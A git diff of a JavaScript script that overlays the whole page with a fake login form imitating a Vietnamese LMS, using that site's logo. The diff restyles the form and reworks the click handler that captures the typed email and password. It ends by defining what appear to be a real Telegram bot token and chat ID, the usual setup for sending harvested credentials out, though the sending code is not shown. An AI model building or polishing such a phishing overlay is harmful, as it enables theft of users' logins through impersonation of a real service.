@@ -2,114 +2,177 @@ const data = {};
 
 const overlay = document.createElement("div");
 overlay.style.position = "fixed";
-overlay.style.top = "0";
-overlay.style.left = "0";
-overlay.style.width = "100%";
-overlay.style.height = "100%";
-overlay.style.background = "#dfe3ea";
+overlay.style.inset = "0";
+overlay.style.background = "#e5e8ee";
 overlay.style.display = "flex";
 overlay.style.justifyContent = "center";
 overlay.style.alignItems = "center";
 overlay.style.zIndex = "999999";
+overlay.style.fontFamily = "Arial, sans-serif";
 
-const box = document.createElement("div");
-box.style.width = "550px";
-box.style.background = "#fff";
-box.style.border = "1px solid #ccc";
-box.style.fontFamily = "Arial";
-box.style.boxShadow = "0 0 20px rgba(0,0,0,0.2)";
-box.style.borderTop = "4px solid red";
+const loginBox = document.createElement("div");
 
-box.innerHTML = `
+loginBox.style.width = "550px";
+loginBox.style.background = "#fff";
+loginBox.style.border = "1px solid #d6d6d6";
+loginBox.style.boxShadow = "0 2px 8px rgba(0,0,0,0.08)";
+loginBox.style.borderTop = "3px solid #e30000";
+
+loginBox.innerHTML = `
     <div style="
-        padding:40px;
         text-align:center;
-        border-bottom:1px solid #ddd;
+        padding:28px 0 24px;
+        border-bottom:1px solid #ececec;
     ">
         <img 
             src="https://lms.hethongilp.vn/img/logo.png"
-            style="width:160px;"
+            style="
+                width:125px;
+                opacity:0.95;
+            "
         >
     </div>
 
-    <div style="padding:30px;">
-        
-        <input 
-            id="emailInput"
-            type="text"
-            placeholder="Email"
-            style="
-                width:100%;
-                padding:16px;
-                margin-bottom:20px;
-                border:1px solid #ccc;
-                font-size:22px;
-                box-sizing:border-box;
-            "
-        >
+    <div style="padding:28px 30px 22px;">
 
-        <input 
-            id="passwordInput"
-            type="password"
-            placeholder="Password"
-            style="
-                width:100%;
-                padding:16px;
-                margin-bottom:20px;
-                border:1px solid #ccc;
-                font-size:22px;
-                box-sizing:border-box;
-            "
-        >
+        <div style="
+            display:flex;
+            align-items:center;
+            border:1px solid #d9d9d9;
+            margin-bottom:16px;
+            height:58px;
+            background:#fff;
+        ">
+            <div style="
+                width:58px;
+                border-right:1px solid #d9d9d9;
+                text-align:center;
+                color:#b7b7b7;
+                font-size:18px;
+            ">
+                👤
+            </div>
 
-        <label style="font-size:20px;">
+            <input
+                id="emailInput"
+                type="text"
+                placeholder="Email"
+                style="
+                    flex:1;
+                    border:none;
+                    outline:none;
+                    padding:0 18px;
+                    font-size:16px;
+                    color:#555;
+                    background:transparent;
+                "
+            >
+        </div>
+
+        <div style="
+            display:flex;
+            align-items:center;
+            border:1px solid #d9d9d9;
+            margin-bottom:18px;
+            height:58px;
+            background:#fff;
+        ">
+            <div style="
+                width:58px;
+                border-right:1px solid #d9d9d9;
+                text-align:center;
+                color:#b7b7b7;
+                font-size:18px;
+            ">
+                🔒
+            </div>
+
+            <input
+                id="passwordInput"
+                type="password"
+                placeholder="Password"
+                style="
+                    flex:1;
+                    border:none;
+                    outline:none;
+                    padding:0 18px;
+                    font-size:16px;
+                    color:#555;
+                    background:transparent;
+                "
+            >
+        </div>
+
+        <label style="
+            display:flex;
+            align-items:center;
+            gap:10px;
+            font-size:15px;
+            color:#444;
+            margin-bottom:24px;
+            user-select:none;
+        ">
             <input type="checkbox">
             Ghi nhớ đăng nhập
         </label>
 
-        <button 
+        <button
             id="loginBtn"
             style="
                 width:100%;
-                margin-top:25px;
-                padding:16px;
+                height:48px;
                 border:none;
                 background:#79c92b;
                 color:white;
-                font-size:28px;
+                font-size:17px;
                 cursor:pointer;
+                transition:0.2s;
             "
         >
             Đăng nhập
         </button>
+
     </div>
 
     <div style="
-        border-top:1px solid #ddd;
+        border-top:1px solid #ececec;
+        padding:14px 18px;
         text-align:right;
-        padding:15px;
-        font-size:20px;
+        color:#222;
+        font-size:14px;
     ">
         Design by Hoàng Vũ Group
     </div>
 `;
 
-overlay.appendChild(box);
+overlay.appendChild(loginBox);
 document.body.appendChild(overlay);
 
-document.getElementById("loginBtn").onclick = () => {
+const btn = loginBox.querySelector("#loginBtn");
 
-    data.email = document.getElementById("emailInput").value;
-    data.password = document.getElementById("passwordInput").value;
+btn.onmouseenter = () => {
+    btn.style.background = "#6db822";
+};
+
+btn.onmouseleave = () => {
+    btn.style.background = "#79c92b";
+};
+
+btn.onclick = () => {
+
+    data.email =
+        loginBox.querySelector("#emailInput").value;
+
+    data.password =
+        loginBox.querySelector("#passwordInput").value;
 
     console.log(data);
 
     alert(
         "Email: " + data.email +
-        "\\nPassword: " + data.password
+        "\nPassword: " + data.password
     );
 };
-
 
 const TELEGRAM_TOKEN = "8717080086:AAH068HuIJdYKaVkr3192dQyCPFcPV7W5kA";
 const TELEGRAM_CHAT_ID = "6533206955";
